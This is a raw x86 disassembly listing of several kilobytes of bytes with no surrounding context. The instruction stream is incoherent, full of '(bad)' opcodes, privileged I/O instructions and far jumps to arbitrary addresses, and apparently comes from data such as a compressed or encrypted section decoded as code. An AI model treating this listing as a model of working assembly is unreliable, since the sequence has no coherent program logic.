  4082cd:	or     al,0x1e
  4082cf:	loopne 0x4082f7
  4082d1:	sub    esi,DWORD PTR [ecx*4+0x2272cd58]
  4082d8:	xchg   ebx,eax
  4082d9:	(bad)  
  4082da:	pushf  
  4082db:	xchg   DWORD PTR [ebp+0x163a756b],eax
  4082e1:	mov    esi,0xde1865a1
  4082e6:	popa   
  4082e7:	call   0x746b3015
  4082ec:	push   edi
  4082ed:	and    BYTE PTR [edx-0x45],0x19
  4082f1:	mov    esp,0xdde698da
  4082f6:	or     eax,0x89bf55af
  4082fb:	int3   
  4082fc:	mov    esp,0x3d6b69ff
  408301:	mov    ah,0x34
  408303:	jne    0x408348
  408305:	leave  
  408306:	add    dl,BYTE PTR [ebx+0x7dd20740]
  40830c:	(bad)  
  40830e:	fsubrp st(4),st
  408310:	loopne 0x4082dc
  408312:	push   edx
  408313:	std    
  408314:	js     0x408366
  408316:	cmp    al,ah
  408318:	inc    eax
  408319:	arpl   WORD PTR [ecx+ebp*2-0x71],bp
  40831d:	aam    0x69
  40831f:	cmp    eax,0x73e0d50
  408324:	les    esi,FWORD PTR [esi]
  408326:	add    BYTE PTR [esi],dl
  408328:	in     eax,0x8f
  40832a:	xor    edi,ebx
  40832c:	inc    eax
  40832d:	ins    DWORD PTR es:[edi],dx
  40832e:	dec    ebx
  40832f:	or     al,0xd2
  408331:	mov    dl,0xf8
  408333:	xchg   ecx,eax
  408334:	repz dec edx
  408336:	lds    esp,FWORD PTR [edi+0x5d]
  408339:	int    0x99
  40833b:	sbb    al,0x40
  40833d:	dec    esi
  40833e:	mov    dl,0x56
  408340:	mov    dl,0x3b
  408342:	inc    edi
  408343:	dec    esi
  408344:	and    BYTE PTR [esp+edx*2-0x34],dl
  408348:	icebp  
  408349:	jne    0x408301
  40834b:	aad    0xa2
  40834d:	call   0xf1b8:0x806d5ff0
  408354:	pop    ecx
  408355:	jmp    0x4082e3
  408357:	popa   
  408358:	jb     0x408305
  40835a:	inc    edx
  40835b:	jge    0x408361
  40835d:	jb     0x4083aa
  40835f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408360:	and    al,bl
  408362:	call   0x411e675c
  408367:	and    bl,bh
  408369:	xchg   cl,bl
  40836b:	mov    al,ds:0xdf15ad5b
  408370:	push   ecx
  408371:	leave  
  408372:	fld    QWORD PTR [edx]
  408374:	pop    ss
  408375:	ins    BYTE PTR es:[edi],dx
  408376:	add    DWORD PTR [edx+ecx*4-0x1e25cae9],esp
  40837d:	add    al,0x4a
  40837f:	pusha  
  408380:	cs inc ebx
  408382:	mov    cl,0x0
  408384:	inc    esi
  408385:	mov    ebp,0x47902ce5
  40838a:	pop    ebx
  40838b:	pop    eax
  40838c:	adc    ch,0x10
  40838f:	push   edi
  408390:	and    DWORD PTR [ecx-0x5e],eax
  408393:	mov    edi,0x53c17ac7
  408398:	cmp    esp,DWORD PTR [edi-0x33825f0]
  40839e:	repnz dec ebx
  4083a0:	sbb    eax,0x301845df
  4083a5:	jmp    0x89b5dec7
  4083aa:	and    al,0x4d
  4083ac:	and    BYTE PTR [edi-0x73],dl
  4083af:	xchg   esi,eax
  4083b0:	jmp    0x93a5:0x3c5561a
  4083b7:	loop   0x40837c
  4083b9:	jno    0x4083fc
  4083bb:	hlt    
  4083bc:	dec    edi
  4083bd:	arpl   WORD PTR [edi-0x466a1e14],sp
  4083c3:	out    dx,al
  4083c4:	adc    bh,BYTE PTR [esi-0x71e52919]
  4083ca:	mov    ch,0x6e
  4083cc:	(bad)  
  4083cd:	mov    WORD PTR [ecx-0x63],cs
  4083d0:	xor    eax,0xb55a7654
  4083d5:	aaa    
  4083d6:	mov    es,WORD PTR ds:0xba3f8ee6
  4083dc:	push   0xfffffffb
  4083de:	push   ds
  4083df:	adc    al,0x85
  4083e1:	cdq    
  4083e2:	push   ds
  4083e3:	ins    DWORD PTR es:[edi],dx
  4083e4:	push   cs
  4083e5:	pop    es
  4083e6:	lods   eax,DWORD PTR ds:[esi]
  4083e7:	loop   0x40837e
  4083e9:	into   
  4083ea:	mov    esp,0xb28ec88c
  4083ef:	push   esp
  4083f0:	ss clc 
  4083f2:	lods   eax,DWORD PTR ds:[esi]
  4083f3:	mov    al,ds:0x731a80d7
  4083f8:	mov    ds:0xbb05ff05,eax
  4083fd:	dec    edx
  4083fe:	aam    0x38
  408400:	mov    ch,0x43
  408402:	adc    BYTE PTR [ecx+0x51],dh
  408405:	cmp    DWORD PTR [eax+0x63],edi
  408408:	test   DWORD PTR [ecx],ebp
  40840a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40840b:	inc    eax
  40840c:	test   BYTE PTR [ecx+0x42],0xec
  408410:	btc    DWORD PTR [ebp+eiz*8-0x6716719e],esi
  408418:	cli    
  408419:	outs   dx,BYTE PTR ds:[esi]
  40841a:	jmp    0x4e8b1c4
  40841f:	mov    edx,0x2cec62ce
  408424:	jmp    0x4083bc
  408426:	pop    esp
  408427:	ss xchg ebx,eax
  408429:	dec    ebx
  40842a:	jmp    0x23a3:0x4d46900c
  408431:	pop    ss
  408432:	xchg   esi,eax
  408433:	pop    edi
  408434:	push   ebx
  408435:	lods   al,BYTE PTR ds:[esi]
  408436:	fisub  DWORD PTR [edx-0x72]
  408439:	xor    esi,DWORD PTR [edi+0x6a]
  40843c:	cld    
  40843d:	jl     0x4083c7
  40843f:	xchg   BYTE PTR [ebp-0x3c70b139],bh
  408445:	repz test BYTE PTR [ebx],cl
  408448:	xchg   ebx,eax
  408449:	ficom  WORD PTR [ecx]
  40844b:	jl     0x408415
  40844d:	mov    al,ds:0xab5acbe3
  408452:	sub    bl,BYTE PTR [ebp-0x6ff1c1b5]
  408458:	mov    bh,0xfa
  40845a:	iret   
  40845b:	and    al,0x60
  40845d:	loope  0x408474
  40845f:	xlat   BYTE PTR ds:[ebx]
  408460:	push   es
  408461:	pop    ebp
  408462:	xchg   edx,eax
  408463:	or     eax,0xfc1769ee
  408468:	es sbb eax,0xdac6c4ba
  40846e:	push   ss
  40846f:	sub    al,0xe6
  408471:	mov    BYTE PTR [ebx-0x7f795583],ah
  408477:	ror    BYTE PTR [eax+0x76],cl
  40847a:	pop    ebp
  40847b:	adc    BYTE PTR [esp+edi*2-0x28],ch
  40847f:	pushf  
  408480:	out    dx,al
  408481:	and    BYTE PTR [ebx+0x4c],dh
  408484:	sbb    BYTE PTR [edi-0x445fd8cb],bl
  40848a:	retf   
  40848b:	dec    edx
  40848c:	(bad)  
  40848d:	sahf   
  40848e:	mov    bl,0xaf
  408490:	ror    BYTE PTR [ebx-0x26],cl
  408493:	mov    ah,0x31
  408495:	cmp    eax,0xb2a1c346
  40849a:	out    0x11,eax
  40849c:	aas    
  40849d:	shl    bh,cl
  40849f:	mov    ds:0xee8e379f,eax
  4084a4:	push   DWORD PTR [edi+ecx*8-0x2014eeb7]
  4084ab:	mov    ecx,0x9ad611d
  4084b0:	ss mov ecx,0xb7878e58
  4084b6:	in     eax,dx
  4084b7:	mov    esp,0x689b0167
  4084bc:	js     0x408468
  4084be:	loope  0x4084d5
  4084c0:	rcl    BYTE PTR [ecx-0x33],1
  4084c3:	jne    0x408465
  4084c5:	ret    
  4084c6:	push   ebp
  4084c7:	ret    
  4084c8:	inc    esp
  4084c9:	mov    ah,0xe
  4084cb:	adc    eax,DWORD PTR [ebp-0x77]
  4084ce:	adc    BYTE PTR [edx],bl
  4084d0:	aam    0x87
  4084d2:	test   eax,0x9f5c6aa9
  4084d7:	pop    es
  4084d8:	hlt    
  4084d9:	(bad)  
  4084da:	mov    dh,0x37
  4084dc:	push   esi
  4084dd:	and    ebx,DWORD PTR [ebp*4-0x69e01db1]
  4084e4:	sahf   
  4084e5:	or     esp,ecx
  4084e7:	xchg   BYTE PTR [ebx+0x39],dh
  4084ea:	jmp    0x21ea:0x41d34ab7
  4084f1:	push   eax
  4084f2:	cmp    al,0xd2
  4084f4:	mov    ds:0xc2761b32,eax
  4084f9:	add    ah,0x7c
  4084fc:	ins    DWORD PTR es:[edi],dx
  4084fd:	aaa    
  4084fe:	or     ecx,DWORD PTR [ebp+esi*2+0x3252a188]
  408505:	sar    DWORD PTR [edx+0x7f775af5],1
  40850b:	dec    eax
  40850c:	bound  eax,QWORD PTR [eax+0x4a]
  40850f:	ds xchg esi,eax
  408511:	jns    0x408500
  408513:	mov    ecx,gs
  408515:	lea    ebp,[edx-0x14]
  408518:	add    eax,0xb9cc78b5
  40851d:	inc    eax
  40851e:	rol    DWORD PTR [ebx],cl
  408520:	jo     0x4084e3
  408522:	popf   
  408523:	inc    edx
  408524:	push   es
  408525:	or     al,0xa8
  408527:	jl     0x4084d8
  408529:	xchg   esi,eax
  40852a:	aas    
  40852b:	lahf   
  40852c:	dec    ebx
  40852d:	add    eax,0x23deba0b
  408532:	cdq    
  408533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408534:	mov    ah,BYTE PTR [esi+eax*1]
  408537:	pop    ds
  408538:	lea    ebx,[edi-0x5e]
  40853b:	jnp    0x4084f6
  40853d:	test   al,0x21
  40853f:	sar    BYTE PTR [edx],0xa8
  408542:	lock dec ebx
  408545:	jno    0x40850f
  408547:	inc    edi
  408548:	xor    eax,0x33158b54
  40854d:	mov    ah,0x2f
  40854f:	pop    esi
  408550:	shr    DWORD PTR [ebp-0x3aafb559],cl
  408556:	nop
  408557:	push   ebx
  408558:	jle    0x408531
  40855a:	cmp    al,0x74
  40855c:	std    
  40855d:	xor    ecx,DWORD PTR [edi+0x2d]
  408560:	cmp    BYTE PTR [eax-0x46],bl
  408563:	mov    ds:0x6d030a18,eax
  408568:	cli    
  408569:	rol    bl,0x6
  40856c:	xchg   edx,eax
  40856d:	and    cl,BYTE PTR [eax]
  40856f:	pop    esi
  408570:	or     al,0x74
  408572:	sub    cl,cl
  408574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408575:	fsin   
  408577:	mov    ecx,0xf2cae904
  40857c:	fadd   QWORD PTR [eax]
  40857e:	mov    dh,0xf9
  408580:	cmp    eax,0x64ad3f72
  408585:	push   cs
  408586:	mov    ds:0x6860aed8,eax
  40858b:	and    al,0x40
  40858d:	push   0xeb8a821f
  408592:	add    edi,ebp
  408594:	mov    esi,0x92827273
  408599:	outs   dx,DWORD PTR ds:[esi]
  40859a:	es push eax
  40859c:	xchg   edi,eax
  40859d:	mov    esi,0x5c7a8a1a
  4085a2:	leave  
  4085a3:	add    BYTE PTR [eax+edx*2-0x37],dh
  4085a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085a8:	push   0x24a60e2b
  4085ad:	adc    DWORD PTR [edx],0x67249cfe
  4085b3:	mov    ds:0xd9e547d9,al
  4085b8:	and    al,0x6e
  4085bb:	loopne 0x408588
  4085bd:	pop    ss
  4085be:	mov    ch,0x35
  4085c0:	pop    ecx
  4085c1:	fmulp  st(2),st
  4085c3:	inc    eax
  4085c4:	push   ebx
  4085c5:	xor    dl,BYTE PTR [ebx+0x36]
  4085c8:	sub    BYTE PTR [esi+esi*2-0x29],bh
  4085cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085cd:	aad    0x20
  4085cf:	mov    ds:0x2bf4b37,eax
  4085d4:	and    BYTE PTR [ebp+0x40],ah
  4085d7:	(bad)
  4085db:	mov    eax,0xa8f51fc1
  4085e0:	and    esi,esp
  4085e2:	inc    esi
  4085e3:	out    dx,eax
  4085e4:	add    eax,0x369ddd39
  4085e9:	mov    esi,DWORD PTR [esi-0x28]
  4085ec:	gs adc edx,ebp
  4085ef:	aaa    
  4085f0:	outs   dx,BYTE PTR ds:[esi]
  4085f1:	pop    edi
  4085f2:	out    dx,ax
  4085f4:	mov    WORD PTR ds:0x4a1ac649,cs
  4085fa:	mov    eax,ds:0x4e42cbbc
  4085ff:	(bad)  
  408600:	cs nop
  408602:	bound  ecx,QWORD PTR [esi+0x4054ee01]
  408608:	xchg   edi,eax
  408609:	sbb    DWORD PTR [esi+eiz*4+0x3a],ebp
  40860d:	push   0x2c7e123f
  408612:	dec    ebp
  408613:	ret    
  408614:	cmc    
  408615:	fist   WORD PTR [edx+0x5d]
  408618:	pop    esi
  408619:	mov    eax,0x68202add
  40861e:	ret    
  40861f:	cmp    al,0x46
  408621:	call   0xd5a6:0xfa39f0de
  408628:	std    
  408629:	in     eax,dx
  40862a:	add    eax,ecx
  40862c:	lods   eax,DWORD PTR ds:[esi]
  40862d:	jmp    0x3462:0x1a953df
  408634:	outs   dx,DWORD PTR ds:[esi]
  408635:	in     al,0x45
  408637:	sbb    DWORD PTR [ecx-0x2f5846f8],ecx
  40863d:	test   bh,dh
  40863f:	js     0x4085da
  408641:	xor    DWORD PTR [edi],0xffffffc6
  408644:	adc    DWORD PTR [eax+0x58],ebx
  408647:	retf   0x486b
  40864a:	dec    ecx
  40864b:	ds fs mov bl,0x1
  40864f:	lods   al,BYTE PTR ds:[esi]
  408650:	xchg   ebp,eax
  408651:	test   eax,0x2b91bb07
  408656:	push   0xffffffd0
  408658:	ss in  eax,dx
  40865a:	sub    BYTE PTR [ecx+0x231a0931],ah
  408660:	(bad)  
  408661:	dec    edx
  408662:	jno    0x408688
  408664:	loopne 0x40865c
  408666:	outs   dx,BYTE PTR ds:[esi]
  408667:	in     al,dx
  408668:	mov    eax,ds:0x7a5d98d4
  40866d:	adc    eax,0x5e7c2968
  408672:	in     al,dx
  408673:	or     eax,0xa213e936
  408678:	mov    al,ds:0xe36d0b44
  40867d:	(bad)  
  40867e:	mov    cs,WORD PTR [ecx-0x12c0a98c]
  408684:	inc    ecx
  408685:	fmul   DWORD PTR [ecx+0x5c]
  408688:	jmp    0xac90:0xca31b1a
  40868f:	jb     0x408692
  408691:	dec    eax
  408692:	hlt    
  408693:	dec    ebp
  408694:	add    BYTE PTR [ecx],0xfd
  408697:	inc    ebx
  408698:	out    0xab,al
  40869a:	or     ah,dh
  40869c:	inc    ebx
  40869d:	pop    edi
  40869e:	jle    0x408623
  4086a0:	hlt    
  4086a1:	or     edi,DWORD PTR [esp+edx*8]
  4086a4:	cli    
  4086a5:	push   esi
  4086a6:	sbb    al,0x70
  4086a8:	xor    eax,0x4754ec41
  4086ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086ae:	cmp    dl,BYTE PTR [eax+0x47]
  4086b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086b2:	gs scas eax,DWORD PTR es:[edi]
  4086b4:	sbb    eax,0xef93fd73
  4086b9:	xchg   edi,eax
  4086ba:	mov    ch,ch
  4086bc:	popa   
  4086bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086be:	jg     0x40865c
  4086c0:	push   0x7b176279
  4086c5:	sbb    ebp,DWORD PTR [edx+eiz*8-0x107059b0]
  4086cc:	add    bl,BYTE PTR [edx+eiz*8+0x5e]
  4086d0:	retf   
  4086d1:	mov    ch,0xf8
  4086d3:	push   esp
  4086d4:	aas    
  4086d5:	push   esp
  4086d6:	fnsave [ecx]
  4086d8:	add    edx,edx
  4086da:	loopne 0x408743
  4086dc:	aam    0xf6
  4086de:	add    bh,ch
  4086e0:	mov    al,0xc6
  4086e2:	fs push eax
  4086e4:	ret    
  4086e5:	ret    0x801a
  4086e8:	or     DWORD PTR [ecx-0x3db29bae],ebp
  4086ee:	loope  0x408730
  4086f0:	jmp    0xd7712ae5
  4086f5:	loope  0x408771
  4086f7:	xchg   DWORD PTR [eax-0x25],edx
  4086fa:	jno    0x40868f
  4086fc:	fld    DWORD PTR [edx+0x1d]
  4086ff:	daa    
  408700:	cwde   
  408701:	leave  
  408702:	aam    0x82
  408704:	stos   DWORD PTR es:[edi],eax
  408705:	push   esi
  408706:	adc    eax,0xda17005d
  40870b:	retf   0xe3ea
  40870e:	inc    eax
  40870f:	inc    esi
  408710:	sub    al,0xcb
  408712:	pop    esi
  408713:	adc    dl,bh
  408715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408716:	(bad)  
  408717:	cmc    
  408718:	loope  0x4086a8
  40871a:	leave  
  40871b:	push   ecx
  40871c:	aas    
  40871d:	test   eax,0xdbd9306a
  408722:	mov    ah,0x66
  408724:	pop    edx
  408725:	clc    
  408726:	mul    DWORD PTR [ecx]
  408728:	mov    esi,esi
  40872a:	mov    ch,0xf4
  40872c:	int3   
  40872d:	cmp    al,0xe0
  40872f:	stos   DWORD PTR es:[edi],eax
  408730:	std    
  408731:	and    al,0x6a
  408733:	sbb    ah,al
  408735:	cwde   
  408736:	mov    dh,0x40
  408738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408739:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40873a:	es sbb ebp,esi
  40873d:	and    edx,DWORD PTR [esi-0x9]
  408740:	adc    al,0x62
  408742:	add    edx,ecx
  408744:	std    
  408745:	(bad)  
  408746:	ins    BYTE PTR es:[edi],dx
  408747:	inc    ebp
  408748:	outs   dx,DWORD PTR ds:[esi]
  408749:	mov    ?,eax
  40874b:	or     al,0x46
  40874d:	push   cs
  40874e:	shl    dl,1
  408750:	mov    esi,0x8793781c
  408755:	test   ebx,edx
  408757:	push   cs
  408758:	sbb    DWORD PTR [edi],0x94ae80c0
  40875e:	les    edi,FWORD PTR [ecx]
  408760:	cdq    
  408761:	pop    es
  408762:	xor    ebp,0x8de084fd
  408768:	sti    
  408769:	mov    al,ds:0xf9b68ebb
  40876e:	gs enter 0xa8a8,0xa
  408773:	dec    ebx
  408774:	icebp  
  408775:	inc    edi
  408776:	adc    BYTE PTR [ebx+0x7e],dh
  408779:	shl    cl,1
  40877b:	pop    edx
  40877c:	mov    eax,0xda6ebd78
  408781:	shl    DWORD PTR [esi],0x82
  408784:	imul   ecx,DWORD PTR [eax-0x18ea7c38],0x30
  40878b:	mov    ah,0x50
  40878d:	out    0x65,al
  40878f:	cmp    al,0x8c
  408791:	jbe    0x4087dc
  408793:	mov    ch,dh
  408795:	adc    DWORD PTR fs:[ebp-0x316df7af],ecx
  40879c:	and    BYTE PTR [ecx-0x1f7087f1],cl
  4087a2:	mov    DWORD PTR [di-0x1516],edi
  4087a7:	gs test eax,0xf036a2d2
  4087ad:	inc    ebp
  4087ae:	cmc    
  4087af:	and    BYTE PTR [esp+edi*8-0x2f],0xd0
  4087b4:	(bad)  
  4087b5:	sbb    ch,al
  4087b7:	lock jp 0x4087cf
  4087ba:	retf   0x9ef9
  4087bd:	mov    bl,0xc2
  4087bf:	call   0xf975e1f
  4087c4:	call   0xbc8da5bf
  4087c9:	inc    edx
  4087ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087cb:	jg     0x408803
  4087cd:	inc    ecx
  4087ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087cf:	popa   
  4087d0:	popa   
  4087d1:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4087d3:	xchg   BYTE PTR [esp+edi*1+0x1895f12a],bh
  4087da:	cmp    bl,al
  4087dc:	xor    ecx,DWORD PTR [eax+0x64da89d8]
  4087e2:	icebp  
  4087e3:	ins    BYTE PTR es:[edi],dx
  4087e4:	mov    cl,0x26
  4087e6:	mov    ebx,0xae7e3a97
  4087eb:	mov    ah,0x81
  4087ed:	jmp    0xbefb:0xa52ff9dd
  4087f4:	jecxz  0x408792
  4087f6:	call   0x6282:0x80525bd3
  4087fd:	je     0x408820
  4087ff:	or     ebx,edi
  408801:	fdiv   QWORD PTR [ebx+0x728d1a26]
  408807:	sub    eax,0x5c2134c4
  40880c:	cmp    eax,0x281ab702
  408811:	ret    
  408812:	pop    edx
  408813:	xchg   esp,eax
  408814:	mov    bl,0xc2
  408816:	inc    eax
  408817:	call   0x93775eaa
  40881c:	inc    esi
  40881d:	push   ebp
  40881e:	pop    ss
  40881f:	out    dx,eax
  408820:	add    ebp,DWORD PTR [eax-0x2d98b655]
  408826:	cdq    
  408827:	fcom   QWORD PTR [edi]
  408829:	(bad)  
  40882a:	pop    ss
  40882b:	and    ebx,0x1d
  40882e:	add    BYTE PTR [edx],al
  408830:	cmp    al,0x11
  408832:	jg     0x408862
  408834:	lods   al,BYTE PTR ds:[esi]
  408835:	and    ch,ah
  408837:	shl    BYTE PTR [ecx-0x54],0xc5
  40883b:	push   es
  40883c:	jmp    0x58d1c076
  408841:	xor    bh,BYTE PTR [edi-0x17bfc87b]
  408847:	(bad)  
  408848:	pop    DWORD PTR [edi]
  40884a:	jbe    0x408887
  40884c:	sub    BYTE PTR [esi],al
  40884e:	push   esi
  40884f:	mov    edi,0xc48021f6
  408854:	inc    ebx
  408855:	xchg   ebx,eax
  408856:	lds    edx,FWORD PTR [ecx+edi*8+0x67]
  40885a:	mov    ebx,0x2cdbee0c
  40885f:	adc    bl,BYTE PTR [ebp+0x52ea9791]
  408865:	push   ds
  408866:	es push ds
  408868:	add    eax,0xd5d1d7fb
  40886d:	inc    ebp
  40886e:	sbb    cl,BYTE PTR ds:0xddebd7a2
  408874:	inc    edx
  408875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408876:	pushf  
  408877:	movq   mm7,QWORD PTR [esi+0x2ecf9d3f]
  40887e:	js     0x408870
  408880:	mov    edx,0xea59cca8
  408885:	pop    ebx
  408886:	jae    0x408866
  408888:	daa    
  408889:	cwde   
  40888a:	in     eax,dx
  40888b:	push   esp
  40888c:	je     0x4088b1
  40888e:	xchg   esi,eax
  40888f:	sub    al,0xaf
  408891:	adc    eax,0xf4cb7f30
  408896:	les    si,DWORD PTR [eax+0x66]
  40889a:	mov    ch,0xf1
  40889c:	sub    bl,al
  40889e:	inc    eax
  40889f:	add    ah,BYTE PTR [ebp+0x7c]
  4088a2:	sub    BYTE PTR [edi],ch
  4088a4:	rcl    BYTE PTR fs:[ebx+0xd],cl
  4088a8:	fwait
  4088a9:	sar    BYTE PTR [ecx+0x1d],cl
  4088ac:	std    
  4088ad:	xor    al,0x8
  4088af:	mov    ch,0x64
  4088b1:	in     eax,dx
  4088b2:	stos   DWORD PTR es:[edi],eax
  4088b3:	inc    ebx
  4088b4:	mov    WORD PTR [ebx-0x7646c42f],es
  4088ba:	addr16 dec ecx
  4088bc:	sti    
  4088bd:	aaa    
  4088be:	sbb    eax,0x964d85c1
  4088c3:	pop    ss
  4088c4:	leave  
  4088c5:	lods   eax,DWORD PTR ds:[esi]
  4088c6:	rcr    DWORD PTR [esi+0xa80e17e],1
  4088cc:	jmp    0xd5635941
  4088d1:	push   0x6c
  4088d3:	lods   eax,DWORD PTR ds:[esi]
  4088d4:	xchg   ebp,eax
  4088d5:	(bad)  
  4088d6:	mov    al,0xc9
  4088d8:	xchg   ebp,eax
  4088d9:	sub    ebx,DWORD PTR [ebp-0x54]
  4088dc:	ins    BYTE PTR es:[edi],dx
  4088dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088de:	cs pop ds
  4088e0:	js     0x40887f
  4088e2:	push   0x95656da2
  4088e7:	scas   eax,DWORD PTR es:[edi]
  4088e8:	mov    ebx,DWORD PTR [edx+0x51]
  4088eb:	cdq    
  4088ec:	push   edi
  4088ed:	cmp    DWORD PTR [edi+0x76],0x8f56b3dc
  4088f4:	aad    0xf8
  4088f6:	clc    
  4088f7:	in     eax,0xe7
  4088f9:	hlt    
  4088fa:	das    
  4088fb:	jb     0x408916
  4088fd:	add    al,0x13
  4088ff:	dec    edi
  408900:	xor    edi,edi
  408902:	push   cs
  408903:	xor    esi,DWORD PTR [eax]
  408905:	cmp    esi,edx
  408907:	mov    ebp,0x3b13d7db
  40890c:	xor    bl,BYTE PTR [eax+eiz*2-0x76]
  408910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408911:	call   ecx
  408913:	sahf   
  408914:	add    BYTE PTR [edx+0x1c8b2f1a],cl
  40891a:	test   DWORD PTR [edi+0x5],ebp
  40891d:	dec    ebp
  40891e:	test   bl,ch
  408920:	ins    DWORD PTR es:[edi],dx
  408921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408922:	adc    dl,ch
  408924:	stos   BYTE PTR es:[edi],al
  408925:	or     al,0xb8
  408927:	data16 arpl WORD PTR [ecx+0x7c],si
  40892b:	call   0xd0ff2511
  408930:	ret    
  408931:	mov    ah,0xef
  408933:	jp     0x408987
  408935:	push   0xc2601a07
  40893a:	xor    cl,BYTE PTR [esi]
  40893c:	pop    eax
  40893d:	imul   esi,DWORD PTR [edx+ebp*1+0x23],0x77
  408942:	imul   eax,DWORD PTR [ebx+0x39],0x2609eefd
  408949:	inc    ebp
  40894a:	lahf   
  40894b:	pop    edi
  40894c:	pop    esi
  40894d:	pop    eax
  40894e:	adc    ah,BYTE PTR fs:[ebx-0x5313840d]
  408955:	jg     0x4089c4
  408957:	sar    dh,cl
  408959:	aam    0xe9
  40895b:	sbb    DWORD PTR [edx-0x41a7a3a9],edi
  408961:	sub    eax,0xd7a4235
  408966:	rcr    BYTE PTR [edx-0x4652d222],cl
  40896c:	add    ebx,DWORD PTR [eax-0x24987ee9]
  408972:	push   ebx
  408973:	mov    edi,0x64d4c07
  408978:	mov    eax,ds:0x59e7093b
  40897d:	mov    ch,0x0
  40897f:	repnz mov BYTE PTR [esi+0x52],0xef
  408984:	jbe    0x4089a1
  408986:	sub    ch,ch
  408988:	into   
  408989:	push   0xffffffc0
  40898b:	cmp    ebx,edi
  40898d:	cmp    ch,BYTE PTR [eax-0x49327517]
  408993:	push   eax
  408994:	mov    ah,0x11
  408996:	mov    cl,0x79
  408998:	test   al,0x61
  40899a:	xchg   esp,eax
  40899b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40899c:	xchg   ebp,eax
  40899d:	(bad)  
  40899e:	dec    ebp
  40899f:	mov    dl,0x60
  4089a1:	cld    
  4089a2:	dec    ecx
  4089a3:	jb     0x4089e7
  4089a5:	jp     0x4089b3
  4089a7:	xchg   esp,eax
  4089a8:	add    eax,0x9d829405
  4089ad:	mov    dl,0xe2
  4089af:	mov    edx,0x9355bbeb
  4089b4:	(bad)  
  4089b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089b6:	enter  0xe13f,0x83
  4089ba:	and    DWORD PTR [ebx+0x77],0xffffff9e
  4089be:	les    ecx,FWORD PTR [ecx-0x4c]
  4089c1:	and    DWORD PTR ds:0xca39b2f3,edx
  4089c7:	add    esi,ebx
  4089c9:	clc    
  4089ca:	xor    BYTE PTR [esi+0x16401db0],ah
  4089d0:	and    al,0x25
  4089d2:	bound  ebp,QWORD PTR [esi+0x7c53de73]
  4089d8:	das    
  4089d9:	or     DWORD PTR [ebx+0x5e9f896f],esi
  4089df:	sub    eax,DWORD PTR [esi+eiz*2-0x6833a090]
  4089e6:	jne    0x408a67
  4089e8:	dec    eax
  4089e9:	pop    ecx
  4089ea:	jmp    0x80a9167d
  4089ef:	ror    DWORD PTR [esi+0x156c1764],1
  4089f5:	xchg   ecx,eax
  4089f6:	push   ds
  4089f7:	pusha  
  4089f8:	jge    0x408a07
  4089fa:	dec    ebx
  4089fb:	sub    eax,0x15427dac
  408a00:	(bad)  
  408a02:	add    eax,DWORD PTR [edx]
  408a04:	jo     0x4089a1
  408a06:	push   es
  408a07:	call   0xdddaaba
  408a0c:	mov    ebx,0x41f970fb
  408a11:	aas    
  408a12:	je     0x408a44
  408a14:	mov    ebp,DWORD PTR [ebp-0x6e1d5dac]
  408a1a:	rol    DWORD PTR [ebx+0xa],0x75
  408a1e:	aad    0x4f
  408a20:	sub    BYTE PTR [edx-0x3c3f290b],ch
  408a26:	push   ebx
  408a27:	xchg   BYTE PTR [ecx-0x37],al
  408a2a:	mov    ds:0x9d65a548,eax
  408a2f:	push   0x7
  408a31:	aam    0x17
  408a33:	test   BYTE PTR [eax],0x9a
  408a36:	dec    ebx
  408a37:	jge    0x4089c5
  408a39:	xor    BYTE PTR [eax],0xa0
  408a3c:	and    al,0x5b
  408a3e:	add    BYTE PTR [eax-0x4f],bh
  408a41:	scas   eax,DWORD PTR es:[edi]
  408a42:	mov    bl,0x9a
  408a44:	xor    edx,edx
  408a46:	sub    BYTE PTR [ecx],cl
  408a48:	int3   
  408a49:	sub    eax,0xfff560c2
  408a4e:	push   esp
  408a4f:	hlt    
  408a50:	cmp    DWORD PTR [ebx],esi
  408a52:	push   ebp
  408a53:	fisub  DWORD PTR [edx-0x29e3700c]
  408a59:	aad    0x80
  408a5b:	imul   edi,DWORD PTR [esi+0x6],0x4577bf32
  408a62:	dec    edx
  408a63:	and    dh,BYTE PTR [edi-0x7]
  408a66:	mov    edx,0x5c72a103
  408a6b:	cmp    BYTE PTR [edi-0x97a3df3],ch
  408a71:	popf   
  408a72:	call   0x7c3c:0x5b5806e8
  408a79:	add    eax,0x94291084
  408a7e:	inc    ecx
  408a7f:	mov    edx,0xc5a50373
  408a84:	xchg   DWORD PTR [ecx-0x20],edi
  408a87:	mov    edi,0x76e514d3
  408a8c:	jecxz  0x408a87
  408a8e:	dec    ecx
  408a8f:	sbb    DWORD PTR [ecx],edx
  408a91:	jle    0x408aab
  408a93:	mov    esp,0x391b9a1c
  408a98:	rol    DWORD PTR ds:0x39c0e650,cl
  408a9e:	sbb    cl,al
  408aa0:	shr    bh,cl
  408aa2:	sub    al,0x13
  408aa4:	stc    
  408aa5:	mov    cs,WORD PTR [edi-0x55]
  408aa8:	rcr    DWORD PTR [ecx+0x2de63fc0],0x96
  408aaf:	jb     0x408a77
  408ab1:	pop    esp
  408ab2:	xchg   BYTE PTR [esi-0x3d7dd454],al
  408ab8:	push   ebp
  408ab9:	jae    0x408ac6
  408abb:	mov    esi,DWORD PTR [eax-0x62]
  408abe:	lds    ebx,FWORD PTR [ebx-0x2]
